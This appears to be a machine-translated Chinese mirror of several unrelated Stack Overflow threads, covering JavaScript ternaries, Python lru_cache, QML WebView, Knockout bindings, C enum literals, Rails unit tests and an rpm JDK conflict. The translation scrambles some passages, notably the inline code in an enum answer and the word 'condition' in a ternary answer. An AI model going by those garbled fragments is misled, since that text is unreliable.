你可能会问为什么只使用[逻辑运算符](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators#Logical_operators)而不是[三元运算符](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators#conditional_operator)，对于简单的情况你可能不会，除非你想确定`a`并且`b`两者都是真的。您还可以使用逻辑运算符实现更简化的复杂条件，使用嵌套的三元运算可能会变得非常混乱......再一次，如果您希望您的代码易于阅读，那么两者都不是那么直观。

* * *

## 回答 #5

> 赞同：35
> 
> 时间：2013-05-10T08:24:01.577

用简单的英语，语法解释：

```
if(condition){
    do_something_if_condition_is_met;
}
else{
    do_something_else_if_condition_is_not_met;
} 
```

可以写成：

```
condition ? do_something_if_condition_is_met : do_something_else_if_condition_is_not_met; 
```

* * *

## 回答 #6

> 赞同：26
> 
> 时间：2015-07-14T03:51:17.050

如果您只想要一个内联 IF（没有 ELSE），您可以使用逻辑 AND 运算符：

```
(a < b) && /*your code*/; 
```

如果您还需要 ELSE，请使用其他人建议的三元运算。

* * *

## 回答 #7

> 赞同：21
> 
> 时间：2012-04-22T17:40:29.227

你可以在 JavaScript 中这样做：

```
a < b ? passed() : failed(); 
```

* * *

## 回答 #8

> 赞同：21
> 
> 时间：2012-04-22T17:44:18.303

```
<div id="ABLAHALAHOO">8008</div>
<div id="WABOOLAWADO">1110</div>

parseInt( $( '#ABLAHALAHOO' ).text()) > parseInt( $( '#WABOOLAWADO ).text()) ? alert( 'Eat potato' ) : alert( 'You starve' ); 
```

* * *

## 回答 #9

> 赞同：8
> 
> 时间：2016-08-01T20:58:51.957

仅供参考，您可以编写[条件运算符](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Conditional_Operator "条件运算符")

```
var a = (truthy) ? 1 : (falsy) ? 2 : 3; 
```

如果您的逻辑足够复杂，那么您可以考虑使用[IIFE](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression "IIFE")

```
var a = (function () {
  if (truthy) return 1;
  else if (falsy) return 2;
  return 3;
})(); 
```

当然，如果您打算多次使用此逻辑，那么您应该将其封装在一个函数中以保持良好和干燥。

* * *

## 回答 #10

> 赞同：8
> 
> 时间：2017-08-31T08:15:25.420

我经常需要在每个条件下运行更多代码，方法是使用：`( , , )`多个代码元素可以执行：

```
var a = 2;
var b = 3;
var c = 0;

( a < b ?  ( alert('hi'), a=3, b=2, c=a*b ) : ( alert('by'), a=4, b=10, c=a/b ) ); 
```

* * *

## 回答 #11

> 赞同：5
> 
> 时间：2020-06-04T18:15:12.060

内联如果：

```
(('hypothesis') ? 'truthy conclusion' : 'falsey conclusion') 
```

真实结论：假设为真时执行的语句

错误结论：假设为假时执行的语句

你的例子：

```
var c = ((a < b) ? 'a<b statements' : '!(a<b) statements'); 
```

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2013-10-10T06:37:51.597

要添加到这一点，您还可以使用带有 && 和 || 的内联 if 条件。运营商。像这样

```
var a = 2;
var b = 0;

var c = (a > b || b == 0)? "do something" : "do something else"; 
```

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2021-09-27T22:02:01.477

JavaScript 中的内联`if`很简单，不需要大括号：

```
if (a < b) doSomething() 
```

从技术上讲，您可以`else`在同一行中有一个，但它需要一个分号：

```
if (a < b) doSomething(); else doSomethingElse() 
```

您的团队的编码标准可能不希望使用上述示例。最重要的是您遵循适用于您的团队的约定。就个人而言，`if`在许多情况下，我更喜欢语句而不是三元组，因为我发现它们更容易阅读。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2021-05-21T07:01:45.233

简化三元运算符

```
var locked = 1;
var canChange = locked != 1 ? true : false; 
```

如果 locked 为 1，则`canChange`变量设置为`false`，否则设置为 true。在这种情况下，您可以使用布尔表达式来简化它，如下所示：

```
var locked = 1;
var canChange = locked != 1; 
```

对于多个 JavaScript 三元运算符 以下示例展示了如何在同一个表达式中使用两个三元运算符：

```
var speed = 90;
var message = speed >= 120 ? 'Too Fast' : (speed >= 80 ? 'Fast' : 'OK');
console.log(message); 
```

当它使代码更易于阅读时，最好使用三元运算符。如果逻辑包含许多 if...else 语句，则不应使用三元运算符。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2015-07-16T14:42:17.677

本质上不是问题：我可以写以下内容吗？

```
if (foo)
  console.log(bar)
else
  console.log(foo + bar) 
```

答案是，是的，上面会翻译。

但是，请注意以下操作

```
if (foo)
  if (bar)
    console.log(foo)
  else 
    console.log(bar)
else 
  console.log(foobar) 
```

确保将模棱两可的代码包含在大括号中，因为上面会引发异常（并且类似的排列会产生不希望的行为。）

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2022-02-26T08:07:29.233

（健康）状况） ？表达式真：表达式假；

例子

```
int a=20, b=10;

if (a>b) {
  cout << "a greater than b";
} else {
  cout << "b greater than a";
} 
```

你可以简单地写：

```
int a=20, b=10;

(a>b) ? cout << "a greater than b" : cout << "b greater than a"; 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2022-03-04T11:54:24.123

您可以使用三元运算符，它等同于简单的 if 和 else。

为两种结果调用函数的三元运算：

```
(a < b) ? DoSomething() : DoSomethingElse(); 
```

三元运算仅针对其中一个结果调用函数：

```
(a < b) ? DoSomething() : {}; 
```

# jsf - JSF+AJAX 推送：实时聊天/通知系统

> ID：10270355
> 
> 赞同：3
> 
> 时间：2012-04-22T17:38:21.583
> 
> 标签：jsf, jakarta-ee, primefaces, push, icepush

我正在尝试向我的网络应用程序添加一些功能，例如“实时用户对用户”聊天（如 Facebook 的聊天）和实时通知系统。

让我们考虑这种情况：我们有两个用户，A 和 B。

A 向 B 发送消息。

如果 B 和 A 之间的聊天窗口在 B 的浏览器上打开，我们更新它，在 B 的浏览器上显示新消息。如果窗口没有打开，我们需要在 B 的浏览器上显示通知或其他内容。

那么，有一个 PrimeFaces Dialog 作为聊天窗口和一个 PrimeFaces NotificationBar 来显示通知，我该怎么做呢？

我不能使用 PrimeFaces 的推送，因为它们不适用于 Glassfish。

我发现了 ICEPush，这似乎是一个不错的方法，但是关于“渲染组”的事情阻止了我尝试它。如果 ICEPush 谈论群组，我如何只更新单个客户端？

我应该为每个客户创建一个新组吗？

类似于：B 有一个“BwithA”组，当 A 向 B 发送消息并打开聊天时更新，还有一个“notificationsB”组，当聊天窗口关闭时更新？

我不知道该怎么做，因为即使以这种方式使用组，A 也必须告诉 B 他需要更新，而 A 不知道 B 是否必须更新对话框或 notificationBar ！

我希望问题是清楚的，因为它不容易解释它|

提前致谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T10:07:19.263

我不知道专业的 Java 程序员会如何解决您的问题，但是当我想创建聊天时，我使用标准的 Primefaces 远程命令组件和回调参数来创建聊天并从服务器向用户发送新消息。

`p:remoteCommand`网页上有一个组件。该组件的目的是在调用动作侦听器时从特定用户获取最新消息。新消息`oncomplete`通过“回调参数”从服务器传递到 javascript 函数（组件事件的处理程序）。然后该函数检查是否有任何消息并将它们附加到聊天框。

有关更多信息，请参阅[如何使用 AJAX 创建 JSF 聊天](http://jetcracker.wordpress.com/2012/03/04/jsf-how-to-create-a-chat-with-ajax/)

UPD：上述解决方案已过时。现在我将使用 JAX-RS Web 服务或 Web 套接字来实现聊天。实时数据流还有一个商业解决方案：**PubNub**、**Pusher**等。

# python - Python：在 lambda 函数上使用 lru_cache，或其他方式为 lambda 函数创建缓存

> ID：10270360
> 
> 赞同：0
> 
> 时间：2012-04-22T17:38:44.597
> 
> 标签：python

有没有办法让它工作？

```
func=i_want_it_to_cache_everything(lambda a,b:a+b) 
```

它**必须在一行中完成**......

更新2：

我想出了解决方案（感谢所有回复的人！）。但是……有一个有趣的现象：缓存减慢程序？

```
import functools,datetime,timeit
@functools.lru_cache(maxsize=50000)
def euclidean_distance3(p1,p2):
    return (p1[0]-p2[0])**2+(p1[1]-p2[1])**2+(p1[2]-p2[2])**2+(p1[3]-p2[3])**2
euclidean_distance=(functools.lru_cache(maxsize=50000)(lambda p1,p2: (p1[0]-p2[0])**2+(p1[1]-p2[1])**2+(p1[2]-p2[2])**2+(p1[3]-p2[3])**2))
euclidean_distance2=lambda p1,p2: (p1[0]-p2[0])**2+(p1[1]-p2[1])**2+(p1[2]-p2[2])**2+(p1[3]-p2[3])**2
print(datetime.datetime.now())
def test1():
    for z in range(50):
        for i in range(200):
            for j in range(200):
                euclidean_distance((i,i,i,i),(j,j,j,j));
def test2():
    for z in range(50):
        for i in range(200):
            for j in range(200):
                euclidean_distance2((i,i,i,i),(j,j,j,j));
def test3():
    for z in range(50):
        for i in range(200):
            for j in range(200):
                euclidean_distance3((i,i,i,i),(j,j,j,j));
t1=timeit.Timer(test1)
print(t1.timeit(1))
t2=timeit.Timer(test2)
print(t2.timeit(1))
t3=timeit.Timer(test3)
print(t3.timeit(1))

print(euclidean_distance.cache_info())
print(euclidean_distance3.cache_info()) 
```

输出：

```
9.989034592910151
4.936129879313011
10.528836308312947
CacheInfo(hits=1960000, misses=40000, maxsize=50000, currsize=40000)
CacheInfo(hits=1960000, misses=40000, maxsize=50000, currsize=40000) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:55:44.400

```
>>> from functools import lru_cache
>>> x = lru_cache()(lambda a,b:a+b)
>>> x(2,3)
5
>>> x(4,2)
6
>>> x(2,3)
5
>>> x.cache_info()
CacheInfo(hits=1, misses=2, maxsize=100, currsize=2) 
```

# qt - 如何使 QML WebView 元素对所有“新窗口”使用 Qt::openUrlExternally？

> ID：10270361
> 
> 赞同：2
> 
> 时间：2012-04-22T17:38:52.533
> 
> 标签：qt, qml

如何使[QML WebView 元素](http://doc.trolltech.com/4.7/qml-webview.html)使用[Qt::openUrlExternally](http://doc.trolltech.com/4.7/qml-qt.html#openUrlExternally-method)而不是一些可视的[newWindowComponent](http://doc.trolltech.com/4.7/qml-webview.html#newWindowComponent-prop)？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-30T19:37:23.300

我认为使用 QML 没有简单的方法可以做到这一点。您可以使用标准来执行此操作`QWebView`，但无法从 QML 中访问此功能。您需要重新包装`QWebView`并公开更多功能。

使用标准 C++ 接口的示例：

**测试.cpp**

```
#include <QtGui>
#include <QtWebKit>
#include "handler.hpp"

int main(int argc, char** argv)
{
    QApplication app(argc, argv);

    QWebView view;
    view.load(QUrl::fromUserInput("http://qt-project.org/"));

    view.page()->setLinkDelegationPolicy(QWebPage::DelegateAllLinks);

    LinkHandler handler;

    QObject::connect(
        &view, SIGNAL(linkClicked(const QUrl&)),
        &handler, SLOT(open(const QUrl&)));

    view.show();

    return app.exec();
} 
```

**处理程序.hpp**

```
#ifndef _HANDLER_HPP_
#define _HANDLER_HPP_

#include <QtGui>

class LinkHandler : public QObject
{
    Q_OBJECT
    public:
        LinkHandler();

    public slots:
        void open(const QUrl& url);
};

#endif 
```

**处理程序.cpp**

```
#include "handler.hpp"

LinkHandler::LinkHandler() : QObject() {}

void LinkHandler::open(const QUrl& url)
{
    QDesktopServices::openUrl(url);
} 
```

**CMakeLists.txt**

```
cmake_minimum_required(VERSION 2.8)

find_package(Qt4 4.8 REQUIRED QtCore QtGui QtWebkit)
include(${QT_USE_FILE})

qt4_wrap_cpp(MOC_FILES handler.hpp)
add_executable(test
    test.cpp
    handler.hpp
    handler.cpp
    ${MOC_FILES})
target_link_libraries(test ${QT_LIBRARIES}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T11:24:50.320

以下代码将在新窗口中打开*所有*链接，但添加检测是微不足道的`target=_blank`

```
WebView{
    id: webView
    url: "samples/sample.html"
    preferredWidth: parent.width
    enabled: false
    onLoadFinished: {
        evaluateJavaScript(' \
            var els = document.getElementsByTagName("a"); \
            for (var i in els){ \
                els[i].onclick = function(e){e.preventDefault(); qml.qmlCall(this.getAttribute("href")); return false;} \
            } \
        ')
        enabled = true;
        }
    javaScriptWindowObjects: QtObject {
        WebView.windowObjectName: "qml"

        function qmlCall(url) {
            console.log(url);
            Qt.openUrlExternally(url)
        }
    }
} 
```

它归结为在加载后在 webview 中添加一些 javascript 以覆盖链接的默认操作并将`href`属性的值传递给 qml，并从那里从外部打开。

# html - 是否有可能使用 Knockout 的值绑定进行脚本注入？

> ID：10270362
> 
> 赞同：2
> 
> 时间：2012-04-22T17:39:07.573
> 
> 标签：html, knockout.js, knockout-2.0

我认为淘汰赛可以处理这种情况，但想确认一下。如果使用带有输入/文本区域之类的表单控件的值绑定，是否没有脚本注入攻击的危险？

或者您是否需要做一些事情来确保在将值设置到视图模型之前对其进行编码？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:52:47.997

该值将按原样保存到视图模型中。这仅取决于您如何使用它。绑定将`text`基于使用`innerText`/`textContent`设置值对内容进行编码。所以，你在那里是安全的。如果要将`html`绑定与通过绑定设置的内容一起使用`value`，则可以注入脚本。

[有关更多信息，请参阅关于 HTML 编码](http://knockoutjs.com/documentation/html-binding.html)的 Knockout doco 。

# google-maps - 地理编码 API 超出速率限制

> ID：10270363
> 
> 赞同：4
> 
> 时间：2012-04-22T17:39:07.900
> 
> 标签：google-maps, google-geocoding-api

我正在使用地理编码 API 来查询一组 100K 用户的位置坐标。但是，由于速率限制，我每天无法触发超过 2500 个请求。出于学习的目的，我需要不受限制的访问。这是我大学的一个项目。有人可以指导我正确的方向吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-22T17:51:44.307

根据服务条款的[使用限制](https://developers.google.com/maps/documentation/geocoding/usage-limits)部分，即使是 Google Geocoding API 的商业用户也没有不受限制的使用：

> 标准 API 的用户 [被允许] 每天 2,500 个免费请求，按客户端和服务器端查询的总和计算。...高级计划客户：[收到]每 24 小时 100,000 个请求的每日免费配额；针对每年购买 Maps APIs Credits 的额外请求。每秒 50 个服务器端请求。... 强制执行这些限制是为了防止滥用和/或重新利用 Google Maps Geocoding API，并且将来可能会更改，恕不另行通知。此外，我们强制执行请求速率限制以防止滥用服务。如果您超过每日限制或以其他方式滥用该服务，Google Maps Geocoding API 可能会暂时停止为您工作。如果您继续超过此限制，您对 Google Maps Geocoding API 的访问可能会被阻止。

您可能需要查看 Google 的[地理编码策略](https://developers.google.com/maps/articles/geocodestrat)文档和/或重新考虑您的实施方法。地理编码是否需要是动态的，还是来自预先存在的数据集？您是否有义务使用 Google Maps Geocoding API，还是可以使用其他服务？

值得注意的是，大多数地理编码服务都会有类似的限制，如果没有，除非事先做出安排，否则运行 100,000 或更多请求通常被认为是不好的做法。您可能需要考虑使用其他地理编码器服务，或托管您自己的地理编码器（例如[TwoFishes](http://twofishes.net/)）来绕过这些限制。

# objective-c - 这两个枚举有什么区别

> ID：10270364
> 
> 赞同：3
> 
> 时间：2012-04-22T17:39:20.570
> 
> 标签：objective-c, enums, bit-manipulation

所以在我的旅行中，我总是看到枚举是这样定义的（当需要位图时）

```
enum {
    UIControlStateNormal       = 0,                       
    UIControlStateHighlighted  = 1 << 0,                  // used when UIControl isHighlighted is set
    UIControlStateDisabled     = 1 << 1,
    UIControlStateSelected     = 1 << 2,                  // flag usable by app (see below)
}; 
```

但是，我最近刚刚查看了 NSJSONSerilization 类，发现一个枚举定义为

```
enum {
    NSJSONReadingMutableContainers = (1UL << 0),
    NSJSONReadingMutableLeaves     = (1UL << 1),
    NSJSONReadingAllowFragments    = (1UL << 2)
};
typedef NSUInteger NSJSONReadingOptions; 
```

所以我想我的问题是做`UL`什么。`1 << 1`和有什么区别`1UL << 1`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T17:40:48.230

在 C++ 中，`UL`仅表示字面量是`unsigned long`整数类型。默认整数文字是`int`.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-22T17:46:20.157

`1 << 1`和之间没有区别`1UL << 1`，但和之间**可以**有区别。取决于平台，并且可以大于 an ，因此如果有很多值， an可能不安全使用。`1 << 33``1UL << 33``unsigned long``int``enum``int`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T17:42:44.733

实际上，您的代码没有区别。

第`1`一个中的类型是，第二个中`int`的类型是。`1UL``unsigned long`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-22T17:45:27.893

代码将相同，没有真正的区别。

但是，`1`第一个代码中`int`的类型是 ，而`1UL`第二个代码中的类型是`unsigned long`。

# asp.net - 如何在不使用 Membership.CreateUser() 的情况下创建用户？

> ID：10270366
> 
> 赞同：0
> 
> 时间：2012-04-22T17:39:24.013
> 
> 标签：asp.net, membership, createuser

有人能告诉我如何在不使用membership.createuser() 的情况下创建用户并在asp.net 中创建用户向导吗？我需要在 CreateUser() 期间对现有表执行额外的插入操作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T22:18:51.837

这里有两种方法：

实现您自己的自定义成员资格提供程序。这比您想象的要容易，而且非常简单。周围有很多文章。

或者

为了节省您一些时间...实现您自己的自定义成员资格提供程序并从 SqlMembershipProvider 类继承。在子类中，除了 CreateUser 方法外，您大多只是将调用“转发”到基类。在这种情况下，您可以让基类完成大部分工作，然后执行您的自定义插入。但是，由于它确实需要在一个事务中（根据您上面的评论），所以事情可能有点麻烦......而且您可能必须在子类中重新实现 CreateUser 方法。

[http://msdn.microsoft.com/en-us/library/system.web.security.sqlmembershipprovider.aspx](http://msdn.microsoft.com/en-us/library/system.web.security.sqlmembershipprovider.aspx)

注意：我现在通过 Wifi 在公共汽车上，但如果你为我包含 emp_details 模式，我几乎很想为你写这个。您使用的是直接 ADO.NET 还是其他东西？

# oop - AWT 组件和自定义接口类型：如何编写好的 OOP 代码？

> ID：10270370
> 
> 赞同：1
> 
> 时间：2012-04-22T17:39:59.230
> 
> 标签：oop, design-patterns

假设我有一个 Swing GUI，它必须以两种不同的方式显示某种类型的信息。从设计模式的角度来看，这里可能会使用策略模式：创建一个接口来定义显示组件和客户端之间的通信方式，如下所示：

```
public interface Foo {
  void showData(Data bar)
} 
```

然后，真正的动作由实现 Foo 的不同组件完成，并且可以创建和插入以完成实际工作。

现在，如果真正的组件是 java.awt.Components，会发生什么？正如我所看到的，它会导致类型转换混乱，因为 Component 是一个类。让我们假设一个像这样的实现：

```
public class Baz extends Component implements Foo {
  ...
} 
```

如果我想传递 Baz 类的对象，这些方法可以使用“Component”作为参数类型或“Foo”。问题是某些方法需要既是 Component 又是 Foo 的对象（例如，因为它们将对象添加到 JPanel，然后提供调用接口方法的数据`showData()`）。

正如我所看到的，我有一些选择可以实现这一点：

*   我可以将引用作为组件传递并转换为 Foo。之前，我必须检查引用是否是 Foo 的实例，并且我必须处理不满足此要求的情况。另一个问题是我必须与组件传递的方法的客户端进行通信，还必须实现 Foo，这很尴尬且容易出错。
*   我可以用 Foo 做同样的事情
*   我可以向 Foo 接口添加一个方法“Component getComponent()”，并且实现将始终返回“this”。这个样板方法可以放入 Component 的抽象子类中。这个解决方案意味着一个我不想要的接口方法和一个我不需要的额外子类。
*   我可以传递两个引用，一个 Component 和一个 Foo 引用到同一个对象。不过，在内部，我必须确保两个引用都属于同一个对象。我必须处理不满足此要求的情况。
*   我可以使用 Component 的抽象子类并使用抽象方法定义接口。这将允许我以类型安全的方式传递引用，但打破了良好的 OOP 实践：保持接口和实现分离以及接口隔离原则。

因此，所有这些解决方案都只是变通方法。有什么我缺少的解决方案吗？我应该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T10:00:46.327

我会使用您提到的策略设计模式，但可能在不同的上下文中。尝试将“鞋拔”并入一个类的问题`Foo`在于`Component`，您可能拥有需要复制代码的实现组合。

例如，假设您有以下实现`Component`：（我使用 Swing 已经太久了，这些类可能不存在）

*   面板
*   按钮
*   菜单

而且您还具有以下实现`Foo`

*   我的福
*   他的福
*   我们的Foo
*   WhatTheFoo

想象一下这些的所有组合：这就是所谓的阶级爆炸。这是策略模式的经典理由。

我会创建一种容器类，它`HAS-A`为每个需要的类使用关系，而不是使用`IS-A`如下关系：（我是 C++ 程序员，所以你必须原谅混合代码：）

```
class ComponentFooHandler {
  Component component_;
  Foo fooImpl_;

  inline Foo getFoo()  {return fooImpl_;}
  void setFoo(Foo f)   {fooImpl_ = f;}

  Component getComponent()        {return component_;}
  void setComponent(Component c)  {component_ = c;}

  void doAction() {
    component_.someAction();
    fooImpl_.anotherAction();
  }
} 
```

然后，您将不得不分别创建不同的实现`Foo`。然后可以根据需要组合`Component`and`Foo`实现，而不必复制 Foo impl 代码。另请注意，您可以调用类似模板模式的方法，`doAction()`这些方法可以在不知道其详细信息的情况下对两者进行操作`Foo`。`Component`

要解决原始问题的问题：

*   当`Component`需要 a 时，调用`getComponent()`处理程序实例
*   当`Foo`需要 a 时，调用`getFoo()`处理程序实例
*   我会避免创建同时需要的方法并将方法 args 拆分为 2
*   或者只是考虑传递一个`ComponentFooHandler`

# android - Android SimpleOnGestureListener 试图检测手指离开运动

> ID：10270376
> 
> 赞同：0
> 
> 时间：2012-04-22T17:40:18.257
> 
> 标签：android, onclick, onclicklistener

嗨，我有一个按钮，当（按下）单击时会触发另一个活动。我还有一个 SimpleOnGestureListener 监听按钮上的滑动，当检测到该滑动时将调用屏幕上的另一个按钮。

我最初遇到的问题是当用户停止滑动手指时，按钮的 onClick 将触发（通过检测 onclick）。我放置了一个布尔检查，所以当检测到幻灯片时，我将其设置为 false，onclick 会对其进行检查。然后我在 onclick 过程结束时重置这个布尔值。简而言之，这意味着...

```
press finger
detect slide
set onClick to Disable
Slide finish
Finger Off
Onclick triggered
ignore all code, and set onclick to Enable. 
```

现在我遇到的问题是 onclick 并不总是触发，所以有时在幻灯片被拾取但 onclick 不是时仍然设置为 false 的问题

我可以在幻灯片结束时检测到手指离开，还是在幻灯片结束时检测到手指，以便我可以重置布尔值？

我见过像 ACTION_UP 这样的东西，但不知道如何使用它来设置我的布尔变量？

为你的帮助干杯。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T12:39:45.577

您将有一种方法来检测像**onTouchEvent(MotionEvent event)**这样的触摸，以检查触发此类事件的操作。

```
 if(event.getAction()== MotionEvent.ACTION_UP){
        yourbool = false;
     } 
```

# c++ - 在 C++ 中使用蛮力生成所有组合

> ID：10270378
> 
> 赞同：1
> 
> 时间：2012-04-22T17:40:26.327
> 
> 标签：c++, combinations, brute-force

我必须制作一个程序，通过使用蛮力方法生成所有可能的组合。

问题如下：

假设我有 3 个任务和 2 个进程。我将制作一个 3x2 数组并进行所有可能的组合，以将每个任务分配给每个进程，从而进行不同的组合。请注意，我不必通过 fork() 或类似的东西创建进程；我只是想展示如何将 3 个任务分配给 2 个进程的所有可能组合。我必须展示每一个组合。将是一个组合，所有任务都通过流程完成。我将向您展示如何创建组合的一些示例。

请注意，它是下面表格格式的二维数组。不要对示例感到困惑，因为它不能在此处以表格格式显示。

例如-1

```
T1 T2
T3 -
- -

```

例如-2

```
T1 T2
- T3
- -

```

例如-3

```
T1 -
T2 -
T3 -

```

例如-4

```
T2 -
T1 -
T3 -

```

因此，所有可能的因素。您可以看到一个示例包含所有任务 IE T1、T2、T3，并且没有一个是重复的。

请帮助我制作一个 C++ 程序来解决这个问题。

最大数组大小可以是 1000x5。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T20:04:21.920

阅读 STL 文档可能会对您有所帮助：

[http://www.cplusplus.com/reference/algorithm/next_permutation/](http://www.cplusplus.com/reference/algorithm/next_permutation/)

# ruby-on-rails - 为什么我的 image_url 单元测试失败了？（来自使用 Rails 'Depot' 的敏捷 Web 开发教程）

> ID：10270379
> 
> 赞同：1
> 
> 时间：2012-04-22T17:40:26.623
> 
> 标签：ruby-on-rails, unit-testing, ruby-on-rails-3.2, depot

我是新手，正在尝试使用 Rails 的*敏捷 Web 开发，第四版*（适用于 Rails 3.2）一书来学习 Rails。到目前为止，能够顺利通关所有章节。如果有错误，通常是我草率的代码（忘记了逗号、'end' 语句等）。但是现在我在模型单元测试一章中遇到了障碍。在我们验证图像 URL 是否以 .gif、.jpg 或 .png 结尾的部分。

我从书中逐字复制了 depot/test/product_test.rb 文件的代码：

```
test "image url" do
ok = %w{ fred.gif fred.jpg fred.png FRED.JPG FRED.Jpg http://a.b.c/x/y/z/fred.gif }
bad = %w{ fred.doc fred.gif/more fred.gif.more }

ok.each do |name|
    assert new_product(name).valid?, "#{name} shouldn't be invalid"
end
bad.each do |name|
    assert new_product(name).invalid?, "#{name} shouldn't be valid"
end 
```

但是当我运行**rake test:units**命令时，出现以下故障...

```
1) Failure:
test_image_url(ProductTest)[../depot/test/unit/product_test.rb:46]:
fred.gif shouldn't be invalid

4 tests, 13 assertions, 1 failures, 0 errors, 0 skips
rake aborted! 
```

这是否意味着它正在测试的图像 URL 无效？如果“fred.gif 不应该无效”是正确的，为什么测试会失败？

我非常有信心这部分测试肯定是不正确的，因为我在那里进行的其他测试（例如“产品属性不能为空”、“产品价格必须为正”等）运行得很好. 如果我取出“测试图像 url”代码块，我不会失败。

请让我知道我做错了什么。如果您需要我发布整个 ProductTest，我可以。

* * *

**更新**：我的 Products 模型中有一个错字导致测试失败。现在都修好了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-07T19:33:29.410

我遇到了同样的问题，我不得不更改我对 new_product 的定义。在我最初的定义中，我在“图片网址”周围加上了引号。一旦我删除了引号，我就没事了。这是代码（我最初的错误是在代码的第五行）：

```
def new_product(image_url)
  Product.new(title:       "My Book Title",
               description: "yyy",
               price:       1,
               image_url:   image_url)
end

test "image url" do
  ok = %w{ fred.gif fred.jpg fred.png FRED.JPG FRED.Jpg
         http://a.b.c/x/y/z/fred.gif }
  bad = %w{ fred.doc fred.gif/more fred.gif.more }

  ok.each do |name|
    assert new_product(name).valid?, "#{name} shouldn't be invalid"
  end

  bad.each do |name|
    assert new_product(name).invalid?, "#{name} shouldn't be valid"
  end
end 
```

如您所见，我没有在我的测试名称中使用“_”并且我的测试通过了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-15T20:33:10.533

好像你缺少下划线`_`

> 测试“图片网址”做

应该

> 测试“image_url”做

您可以在此处查看我文件中的段落：

```
test "image_url" do
ok = %w{ fred.gif fred.jpg fred.png FRED.JPG FRED.Jpg   http://a.b.c/x/y/z.gif}
bad = %w{ fred.doc fred.gif/more fred.gif.more }
ok.each do |name|
    assert new_product(name).valid?, "#{name} shouldn't be invalid"
end
bad.each do |name|
    assert new_product(name).invalid?, "#{name} shouldn't be valid"
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-31T18:57:15.577

我相信问题出在函数“new_product”的定义中。确保函数将所有字段设置为有效数据。我的没有将描述设置为有效值。我希望这有帮助。您可能已经找到了这个解决方案，但没有更新您的帖子。

我要说的是，由于其他领域，该产品正在失败。失败的测试是检查使用每个 image_url 构建的产品中是否没有错误。您只需要检查构造函数 new_product 是否可以构造一个有效的产品。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-11-17T17:56:22.373

我只是在为此苦苦挣扎。模型也有错别字。有了我的验证。`\Z`我将与分组`png`。它需要在捕获组之外。

错误的：

```
class Product < ApplicationRecord
  validates :title, :description, :image_url, presence: true
  validates :price, numericality: { greater_than_or_equal_to: 0.01 }
  validates :title, uniqueness: true
  validates :image_url, allow_blank: true, format: {
    with: %r{\.(gif|jpg|png\Z)}i, # <<<<<----
    message: 'must be a URL for GIF, JPG, or PNG image.'
  }
end 
```

正确的：

```
class Product < ApplicationRecord
  validates :title, :description, :image_url, presence: true
  validates :price, numericality: { greater_than_or_equal_to: 0.01 }
  validates :title, uniqueness: true
  validates :image_url, allow_blank: true, format: {
    with: %r{\.(gif|jpg|png)\Z}i, # <<<<<----
    message: 'must be a URL for GIF, JPG, or PNG image.'
  }
end 
```

# linux - 安装 Sun JDK 7 时的事务检查错误

> ID：10270380
> 
> 赞同：1
> 
> 时间：2012-04-22T17:40:29.210
> 
> 标签：linux, java, java-7

我的一个 linux 实例，我正在尝试使用 rpm 安装 JDK 7。已经安装了 JRE 6，我想安装 JDK 7。当我尝试安装 JDK 7 时，出现以下错误：

```
# rpm -ivh jdk-7u3-linux-x64.rpm
  Preparing...                ########################################### [100%]
    file /etc/init.d/jexec from install of jdk-2000:1.7.0_03-fcs.x86_64 conflicts with file from package jre-1.6.0_20-fcs.x86_64 
```

我还尝试使用 yum 安装：

```
# yum install jdk-7u3-linux-x64.rpm 
```

这导致了事务检查错误：

```
Transaction Check Error:
    file /etc/init.d/jexec from install of jdk-2000:1.7.0_03-fcs.x86_64 conflicts with file from package jre-1.6.0_20-fcs.x86_64 
```

有人可以帮我安装这个。我必须保留已经安装的 JRE 6，所以删除它不是我的解决方案。

任何帮助将不胜感激！

谢谢

诺曼 A.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-04T18:22:21.067

我在使用 YUM 时遇到了同样的问题。

关键是使用 rpm 后跟 --force 标志，即您首先安装 JRE 1.6（您已经安装了），然后发出这样的 rpm 命令

```
rpm -ivh jdk-7u3-linux-x64.rpm --force 
```

然后它安装较新的 JDK，不介意任何错误。

两个 java 版本之间的文件*/etc/init.d/jexec*完全相同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-30T15:20:50.550

没有找到任何解决方案，所以我继续使用可用于相应 JDK 版本的 tar 文件安装 JDK。

——诺曼 A。

# vba - 在 MS Word 2007 中传输特定表格内容的宏

> ID：10270391
> 
> 赞同：-1
> 
> 时间：2012-04-22T17:41:33.223
> 
> 标签：vba, ms-word, word-2007

我有大约 50 个旧格式的 word 文档，我需要将其转换为新格式。我正在考虑使用新格式模板并使用宏将所需的编号字段从旧格式复制到新格式中，最后保存这个新文档。

